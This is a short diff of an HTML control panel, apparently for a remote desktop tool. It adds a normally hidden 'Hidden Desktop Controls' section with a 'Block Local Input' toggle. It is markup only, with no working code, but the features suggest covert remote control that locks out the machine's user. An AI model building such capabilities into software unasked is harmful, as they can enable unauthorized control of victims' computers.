@@ -74,6 +74,20 @@
         <span id="status" data-state="">Idle</span>
       </div>
 
+      <div class="hud-section hidden-desktop-controls" id="hiddenDesktopControls" data-requires-hidden="true" style="display: none;">
+        <div class="section-title">Hidden Desktop Controls</div>
+        <div class="fields">
+          <div class="field toggle-field">
+            <label for="inputBlockingToggle">Block Local Input</label>
+            <label class="toggle-switch">
+              <input type="checkbox" id="inputBlockingToggle" />
+              <span class="toggle-slider"></span>
+            </label>
+          </div>
+        </div>
+        <div id="inputBlockingStatus" class="hint" data-state="">Input blocking: OFF</div>
+      </div>
+
       <div class="hud-section" id="appLauncher" data-requires-manage="true">
         <div class="section-title">Apps</div>
         <div class="app-buttons">
